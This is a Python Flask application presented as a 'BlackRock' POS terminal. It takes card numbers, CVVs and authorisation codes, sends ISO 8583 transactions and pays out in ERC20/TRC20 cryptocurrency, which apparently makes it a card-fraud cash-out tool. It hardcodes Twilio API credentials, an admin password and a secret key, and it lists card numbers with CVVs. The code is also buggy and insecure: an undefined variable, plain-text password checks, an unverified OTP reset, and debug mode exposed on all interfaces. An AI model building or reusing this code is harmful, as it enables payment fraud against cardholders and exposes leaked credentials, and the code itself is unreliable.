from flask import Flask, render_template, request, redirect, session, url_for, send_file, flash
import random, logging, qrcode, io, os, json, hashlib, re, socket
from datetime import datetime
from functools import wraps
from iso8583_crypto import send_erc20_payout, send_trc20_payout, send_iso8583_transaction, load_config
from xhtml2pdf import pisa
from werkzeug.security import generate_password_hash, check_password_hash
from twilio.rest import Client

app = Flask(__name__)
app.secret_key = 'blackrock_secret_key_8583'
logging.basicConfig(level=logging.INFO)

# Constants
USERNAME = "blackrockadmin"
DEFAULT_PASSWORD = "Br_3339"
PASSWORD_FILE = "password.json"
TX_LOG = "transactions.json"
OTP_FILE = "otp.json"
CONFIG = load_config()

# Twilio Configuration
TWILIO_SID = "ACdb98fb2972c2ed066994ddef56de1b6f"
TWILIO_AUTH_TOKEN = "803463ddd413bc4d7375ac780d439195"
TWILIO_NUMBER = "+13515297285"
client = Client(TWILIO_SID, TWILIO_AUTH_TOKEN)

# Ensure password.json exists
if not os.path.exists(PASSWORD_FILE):
    with open(PASSWORD_FILE, "w") as f:
        json.dump({"password": generate_password_hash(Br_3339)}, f)

# Ensure transaction log
if not os.path.exists(TX_LOG):
    with open(TX_LOG, "w") as f:
        json.dump([], f)

def check_password(raw):
    with open(PASSWORD_FILE) as f:
        return json.load(f)['password'] == raw

def set_password(newpass):
    with open(PASSWORD_FILE, "w") as f:
        json.dump({"password": newpass}, f)

def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get("logged_in"):
            flash("You must be logged in.")
            return redirect(url_for("login"))
        return f(*args, **kwargs)
    return decorated

# ======================== OTP & Forgot Password ========================
def send_otp_sms(phone, otp):
    try:
        client.messages.create(
            body=f"Your BlackRock OTP is: {otp}",
            from_=TWILIO_NUMBER,
            to=phone
        )
    except Exception as e:
        print("SMS Error:", e)

@app.route('/forgot-password', methods=['GET', 'POST'])
def forgot_password():
    if request.method == 'POST':
        phone = request.form.get('phone')
        otp = str(random.randint(100000, 999999))
        session['reset_phone'] = phone
        session['reset_otp'] = otp
        send_otp_sms(phone, otp)
        flash("OTP sent to your mobile number.")
        return redirect(url_for('reset_password'))
    return render_template("forgot_password.html")

@app.route('/reset-password', methods=['GET', 'POST'])
def reset_password():
    if request.method == 'POST':
        otp = request.form.get('otp')
        newpass = request.form.get('new_password')
        if otp == session.get('reset_otp'):
            set_password(newpass)
            flash("Password reset successful. Please login.")
            session.pop('reset_otp', None)
            session.pop('reset_phone', None)
            return redirect(url_for('login'))
        else:
            flash("Invalid OTP. Please try again.")
    return render_template("reset_password.html")

@app.route('/')
def home():
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        user = request.form.get('username')
        passwd = request.form.get('password')

        # Load stored credentials
        with open(PASSWORD_FILE) as f:
            stored = json.load(f)
            stored_user = stored.get("username", USERNAME)
            stored_pass = stored.get("password")

        if user == stored_user and passwd == stored_pass:
            session['logged_in'] = True
            return redirect(url_for('protocol'))

        flash("Invalid username or password.")
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.clear()
    flash("You have been logged out.")
    return redirect(url_for('login'))
    
@app.route('/change-password', methods=['GET', 'POST'])
@login_required
def change_password():
    if request.method == 'POST':
        current = request.form['current']
        new = request.form['new']
        if not check_password(current):
            return render_template('change_password.html', error="Current password incorrect.")
        set_password(new)
        return render_template('change_password.html', success="Password changed.")
    return render_template('change_password.html')

DUMMY_CARDS = {
    "4114755393849011": {"expiry": "0926", "cvv": "363", "auth": "1942", "type": "POS-101.1"},
    "4000123412341234": {"expiry": "1126", "cvv": "123", "auth": "4021", "type": "POS-101.1"},
    "4117459374038454": {"expiry": "1026", "cvv": "258", "auth": "384726", "type": "POS-101.4"},
    "4123456789012345": {"expiry": "0826", "cvv": "852", "auth": "495128", "type": "POS-101.4"},
    "5454957994741066": {"expiry": "1126", "cvv": "746", "auth": "627192", "type": "POS-101.6"},
    "6011000990131077": {"expiry": "0825", "cvv": "330", "auth": "8765", "type": "POS-101.7"},
    "3782822463101088": {"expiry": "1226", "cvv": "1059", "auth": "0000", "type": "POS-101.8"},
    "3530760473041099": {"expiry": "0326", "cvv": "244", "auth": "712398", "type": "POS-201.1"},
    "4114938274651920": {"expiry": "0926", "cvv": "463", "auth": "3127", "type": "POS-101.1"},
    "4001948263728191": {"expiry": "1026", "cvv": "291", "auth": "574802", "type": "POS-101.4"},
    "6011329481720394": {"expiry": "0825", "cvv": "310", "auth": "8891", "type": "POS-101.7"},
    "378282246310106":  {"expiry": "1226", "cvv": "1439", "auth": "0000", "type": "POS-101.8"},
    "3531540982734612": {"expiry": "0326", "cvv": "284", "auth": "914728", "type": "POS-201.1"},
    "5456038291736482": {"expiry": "1126", "cvv": "762", "auth": "695321", "type": "POS-201.3"},
    "4118729301748291": {"expiry": "1026", "cvv": "249", "auth": "417263", "type": "POS-201.5"}
}

PROTOCOLS = {
    "POS Terminal -101.1 (4-digit approval)": 4,
    "POS Terminal -101.4 (6-digit approval)": 6,
    "POS Terminal -101.6 (Pre-authorization)": 6,
    "POS Terminal -101.7 (4-digit approval)": 4,
    "POS Terminal -101.8 (PIN-LESS transaction)": 4,
    "POS Terminal -201.1 (6-digit approval)": 6,
    "POS Terminal -201.3 (6-digit approval)": 6,
    "POS Terminal -201.5 (6-digit approval)": 6
}

FIELD_39_RESPONSES = {
    "05": "Do Not Honor",
    "14": "Terminal unable to resolve encrypted session state. Contact card issuer",
    "54": "Expired Card",
    "82": "Invalid CVV",
    "91": "Issuer Inoperative",
    "92": "Invalid Terminal Protocol"
}

@app.route('/protocol', methods=['GET', 'POST'])
@login_required
def protocol():
    if request.method == 'POST':
        selected = request.form.get('protocol')
        if selected not in PROTOCOLS:
            return redirect(url_for('rejected', code="92", reason=FIELD_39_RESPONSES["92"]))
        session['protocol'] = selected
        session['code_length'] = PROTOCOLS[selected]
        return redirect(url_for('amount'))
    return render_template('protocol.html', protocols=PROTOCOLS.keys())

@app.route('/amount', methods=['GET', 'POST'])
@login_required
def amount():
    if request.method == 'POST':
        session['amount'] = request.form.get('amount')
        return redirect(url_for('payout'))
    return render_template('amount.html')

@app.route('/payout', methods=['GET', 'POST'])
@login_required
def payout():
    if request.method == 'POST':
        method = request.form['method']
        wallet = request.form.get(f'{method.lower()}_wallet', '').strip()
        session['payout_type'] = method
        session['wallet'] = wallet
        return redirect(url_for('card'))
    return render_template('payout.html')

@app.route('/card', methods=['GET', 'POST'])
@login_required
def card():
    if request.method == 'POST':
        pan = request.form['pan'].replace(" ", "")
        expiry = request.form['expiry'].replace("/", "")
        cvv = request.form['cvv']
        session.update({'pan': pan, 'exp': expiry, 'cvv': cvv})
        return redirect(url_for('auth'))
    return render_template('card.html')

@app.route('/auth', methods=['GET', 'POST'])
@login_required
def auth():
    expected_length = session.get('code_length', 6)
    if request.method == 'POST':
        code = request.form.get('auth')
        if len(code) != expected_length:
            return render_template('auth.html', warning=f"Code must be {expected_length} digits.")
        txn_id = f"TXN{random.randint(100000, 999999)}"
        arn = f"ARN{random.randint(100000000000, 999999999999)}"
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        session.update({
            "txn_id": txn_id, "arn": arn, "timestamp": timestamp,
            "field39": "00", "auth_code": code
        })

        try:
            send_iso8583_transaction(session)
            if session['payout_type'] == 'ERC20':
                send_erc20_payout(session['wallet'], float(session['amount']))
            elif session['payout_type'] == 'TRC20':
                send_trc20_payout(session['wallet'], float(session['amount']))

            # Send SMS success
            client.messages.create(
                body=f"✅ Transaction successful. TXN ID: {txn_id}, Amount: {session['amount']}",
                from_=TWILIO_NUMBER,
                to=session.get('reset_phone', TWILIO_NUMBER)  # fallback
            )

        except Exception as e:
            # Send failure SMS
            client.messages.create(
                body=f"❌ Transaction failed: {str(e)}",
                from_=TWILIO_NUMBER,
                to=session.get('reset_phone', TWILIO_NUMBER)
            )
            flash(f"Payout Error: {str(e)}")
            return redirect(url_for('rejected', code="91", reason=str(e)))

        with open(TX_LOG, "r+") as f:
            history = json.load(f)
            history.append({
                "txn_id": txn_id, "arn": arn, "amount": session['amount'],
                "timestamp": timestamp, "wallet": session['wallet'],
                "payout": session['payout_type'], "card": session['pan'][-4:]
            })
            f.seek(0)
            json.dump(history, f, indent=2)
        return redirect(url_for('success'))
    return render_template('auth.html')

@app.route('/success')
@login_required
def success():
    return render_template('success.html',
        txn_id=session.get("txn_id"),
        arn=session.get("arn"),
        pan=session.get("pan", "")[-4:],
        amount=session.get("amount"),
        timestamp=session.get("timestamp")
    )

@app.route('/receipt')
@login_required
def receipt():
    return render_template("receipt.html", **session)

@app.route('/receipt.pdf')
@login_required
def receipt_pdf():
    html = render_template("receipt.html", **session)
    result = io.BytesIO()
    pisa.CreatePDF(io.StringIO(html), dest=result)
    result.seek(0)
    return send_file(result, download_name="receipt.pdf", as_attachment=True)

@app.route('/transactions')
@login_required
def transactions():
    with open(TX_LOG) as f:
        data = json.load(f)
    return render_template("transactions.html", transactions=data)

@app.route('/rejected')
def rejected():
    return render_template('rejected.html',
        code=request.args.get("code"),
        reason=request.args.get("reason", "Transaction Declined")
    )

@app.route('/offline')
@login_required
def offline():
    return render_template('offline.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000, debug=True)
